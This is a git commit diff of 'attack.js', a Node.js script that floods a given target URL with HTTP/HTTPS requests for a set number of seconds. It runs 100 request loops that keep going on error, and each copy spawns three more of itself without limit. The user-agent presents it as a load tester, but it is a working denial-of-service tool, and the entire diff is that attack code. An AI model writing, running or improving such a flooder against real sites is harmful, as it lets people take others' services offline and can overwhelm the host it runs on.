817749a0512d70c2fae46eaacd1f1aee9d5adb5f
syntaxbinladen3 <tskforcests@gmail.com>
2025-05-08 22:25:24 +0200

    Update attack.js

--- attack.js
+++ attack.js
@@ -1,7 +1,7 @@
-// attack.js
-const net = require('net');
-const tls = require('tls');
+const http = require('http');
+const https = require('https');
 const { URL } = require('url');
+const { spawn } = require('child_process');
 
 if (process.argv.length < 4) {
   console.log('USAGE: node attack.js https://target.com time_in_seconds');
@@ -13,70 +13,49 @@ const duration = parseInt(process.argv[3]) * 1000;
 const endTime = Date.now() + duration;
 
 const isHttps = target.protocol === 'https:';
-const port = target.port || (isHttps ? 443 : 80);
-const host = target.hostname;
-const path = target.pathname + target.search;
+const client = isHttps ? https : http;
 
-let totalSent = 0;
-let lastSent = 0;
-let maxRps = 0;
+const options = {
+  hostname: target.hostname,
+  port: target.port || (isHttps ? 443 : 80),
+  path: target.pathname + target.search,
+  method: 'GET',
+  headers: {
+    'User-Agent': 'LoadTester/1.0',
+    'Connection': 'keep-alive'
+  }
+};
 
-const REQUEST = [
-  `GET ${path} HTTP/1.1`,
-  `Host: ${host}`,
-  `User-Agent: LoadTester/1.1`,
-  `Connection: keep-alive`,
-  ``,
-  ``
-].join('\r\n');
+function sendRequest() {
+  if (Date.now() > endTime) return;
 
-function createSocketConnection() {
-  const client = isHttps
-    ? tls.connect(port, host, { rejectUnauthorized: false })
-    : net.connect(port, host);
-
-  client.on('connect', () => {
-    pumpRequests(client);
+  const req = client.request(options, res => {
+    // Ignore response body
+    res.on('data', () => {});
+    res.on('end', sendRequest); // Send next request when done
   });
 
-  client.on('error', () => {
-    setTimeout(createSocketConnection, 100); // Retry on error
+  req.on('error', () => {
+    // Ignore errors and keep going
+    sendRequest();
   });
 
-  client.on('end', () => {
-    createSocketConnection(); // Restart on end
-  });
+  req.end();
 }
 
-function pumpRequests(socket) {
-  const interval = setInterval(() => {
-    if (Date.now() > endTime) {
-      clearInterval(interval);
-      socket.destroy();
-      return;
-    }
-
-    try {
-      socket.write(REQUEST);
-      totalSent++;
-    } catch (e) {
-      socket.destroy();
-    }
-  }, 0); // As fast as it can
+const concurrent = 100;
+for (let i = 0; i < concurrent; i++) {
+  sendRequest();
 }
 
-// Launch 100 socket connections
-const sockets = 100;
-for (let i = 0; i < sockets; i++) {
-  createSocketConnection();
+// Automatically start 3 instances of this script
+function spawnInstances() {
+  for (let i = 0; i < 3; i++) {
+    spawn('node', ['attack.js', process.argv[2], process.argv[3]], {
+      stdio: 'inherit'  // Inherit the output to the console
+    });
+  }
 }
 
-// Logging every 3 seconds
-setInterval(() => {
-  const nowSent = totalSent;
-  const rps = nowSent - lastSent;
-  if (rps > maxRps) maxRps = rps;
-  lastSent = nowSent;
-
-  process.stdout.write(`\rTotal sent: ${totalSent}  |  Max-r: ${maxRps} rps     `);
-}, 3000);
+// Start the additional instances
+spawnInstances();
